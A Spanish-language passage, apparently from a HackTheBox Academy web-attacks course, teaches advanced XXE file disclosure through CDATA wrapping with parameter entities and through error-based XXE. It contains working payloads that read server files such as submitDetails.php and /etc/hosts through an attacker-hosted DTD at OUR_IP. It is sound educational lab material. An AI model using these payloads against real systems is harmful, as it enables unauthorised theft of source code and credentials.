# Advanced File Disclosure

No todas las vulnerabilidades XXE pueden ser sencillas de explotar, como hemos visto en la sección anterior. Es posible que algunos formatos de archivo no sean legibles a través de XXE básico, mientras que en otros casos, la aplicación web puede no generar ningún valor de entrada en algunos casos, por lo que podemos intentar forzarlo a través de errores.

---

# **Exfiltración avanzada con Cdata**

En la sección anterior, vimos cómo podríamos usar filtros PHP para codificar archivos fuente de PHP, de modo que no romperían el formato XML cuando se hace referencia, lo que (como vimos) nos impidió leer estos archivos. Pero, ¿qué pasa con otros tipos de aplicaciones web? Podemos utilizar otro método para extraer cualquier tipo de datos (incluidos los datos binarios) para cualquier backend de la aplicación web. Para obtener datos que no se ajustan al formato XML, podemos envolver el contenido de la referencia de archivo externo con un`CDATA`Etiqueta (por ejemplo`<![CDATA[ FILE_CONTENT ]]>`). De esta manera, el analizador XML consideraría esta parte de datos sin procesar, que pueden contener cualquier tipo de datos, incluidos los caracteres especiales.

Una manera fácil de abordar este problema sería definir un`begin`entidad interna con`<![CDATA[`, un`end`entidad interna con`]]>`, y luego coloque nuestro archivo de entidad externa en el medio, y debe considerarse como un`CDATA`elemento, como sigue:

Código:xml

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>

```

Después de eso, si hacemos referencia al`&joined;`entidad, debe contener nuestros datos escapados. Sin embargo,`this will not work, since XML prevents joining internal and external entities`, así que tendremos que encontrar una mejor manera de hacerlo.

Para evitar esta limitación, podemos utilizar`XML Parameter Entities`, un tipo especial de entidad que comienza con un`%`personaje y solo se puede usar dentro del DTD. Lo único de las entidades de parámetros es que si las referimos a una fuente externa (por ejemplo, nuestro propio servidor), entonces todos se considerarían externos y se pueden unir, de la siguiente manera:

Código:xml

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Entonces, intentemos leer el`submitDetails.php`Archivo almacenando primero la línea anterior en un archivo DTD (por ejemplo,`xxe.dtd`), alojarlo en nuestra máquina y luego hacer referencia a una entidad externa en la aplicación web de destino, de la siguiente manera:

Divulgación de archivos avanzados

```
xnoxos@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtdxnoxos@htb[/htb]$ python3 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Ahora, podemos hacer referencia a nuestra entidad externa (`xxe.dtd`) y luego imprima el`&joined;`entidad que definimos anteriormente, que debe contener el contenido del`submitDetails.php`Archivo, como sigue:

Código:xml

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->

```

Una vez que escribimos nuestro

```
xxe.dtd
```

archivo, alojarlo en nuestra máquina y luego agregar las líneas anteriores a nuestra solicitud HTTP a la aplicación web vulnerable, finalmente podemos obtener el contenido del

```
submitDetails.php
```

archivo:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg)

Como podemos ver, pudimos obtener el código fuente del archivo sin necesidad de codificarlo a Base64, lo que ahorra mucho tiempo cuando pasa varios archivos para buscar secretos y contraseñas.

**Nota:**En algunos servidores web modernos, es posible que no podamos leer algunos archivos (como index.php), ya que el servidor web evitaría un ataque de DOS causado por la autorreferencia de archivo/entidad (es decir, el bucle de referencia de entidad XML), como se menciona en la sección anterior.

Este truco puede ser muy útil cuando el método XXE básico no funciona o cuando se trata de otros marcos de desarrollo web.`Try to use this trick to read other files`.

---

# **XXE basado en errores**

Otra situación en la que podemos encontrarnos es una en la que la aplicación web podría no escribir ninguna salida, por lo que no podemos controlar ninguna de las entidades de entrada XML para escribir su contenido. En tales casos, estaríamos`blind`a la salida XML y, por lo tanto, no podría recuperar el contenido del archivo utilizando nuestros métodos habituales.

Si la aplicación web muestra errores de tiempo de ejecución (por ejemplo, errores de PHP) y no tiene un manejo de excepción adecuado para la entrada XML, entonces podemos usar esta falla para leer la salida del Exploit XXE. Si la aplicación web no escribe salida XML ni muestra ningún error, enfrentaríamos una situación completamente ciega, que discutiremos en la siguiente sección.

Consideremos el ejercicio que tenemos en

```
/error
```

Al final de esta sección, en el que ninguna de las entidades de entrada XML se muestra en la pantalla. Debido a esto, no tenemos una entidad que podamos controlar para escribir la salida del archivo. Primero, intentemos enviar datos XML malformados y ver si la aplicación web muestra algún error. Para hacerlo, podemos eliminar cualquiera de las etiquetas de cierre, cambiar una de ellas, para que no se cierre (por ejemplo,

```
<roo>
```

en lugar de

```
<root>
```

), o simplemente hacer referencia a una entidad inexistente, como sigue:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg)

Vemos que realmente hicimos que la aplicación web muestre un error, y también reveló el directorio del servidor web, que podemos usar para leer el código fuente de otros archivos. Ahora, podemos explotar este defecto para exfiltrar el contenido del archivo. Para hacerlo, utilizaremos una técnica similar a lo que utilizamos anteriormente. Primero, alojaremos un archivo DTD que contenga la siguiente carga útil:

Código:xml

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

```

La carga útil anterior define la`file`Entidad de parámetro y luego se une con una entidad que no existe. En nuestro ejercicio anterior, nos uníamos a tres cuerdas. En este caso,`%nonExistingEntity;`no existe, por lo que la aplicación web arrojaría un error diciendo que esta entidad no existe, junto con nuestro unido`%file;`como parte del error. Hay muchas otras variables que pueden causar un error, como un URI malo o tener malos caracteres en el archivo referenciado.

Ahora, podemos llamar a nuestro script DTD externo y luego hacer referencia al`error`entidad, como sigue:

Código:xml

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>

```

Una vez que alojamos nuestro script DTD como lo hicimos anteriormente y enviamos la carga útil anterior como nuestros datos XML (no es necesario incluir ningún otro datos XML), obtendremos el contenido del

```
/etc/hosts
```

Archivo de la siguiente manera:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg)

Este método también se puede usar para leer el código fuente de los archivos. Todo lo que tenemos que hacer es cambiar el nombre del archivo en nuestro script DTD para señalar el archivo que queremos leer (por ejemplo,`"file:///var/www/html/submitDetails.php"`). Sin embargo,`this method is not as reliable as the previous method for reading source files`, ya que puede tener limitaciones de longitud, y ciertos caracteres especiales aún pueden romperlo.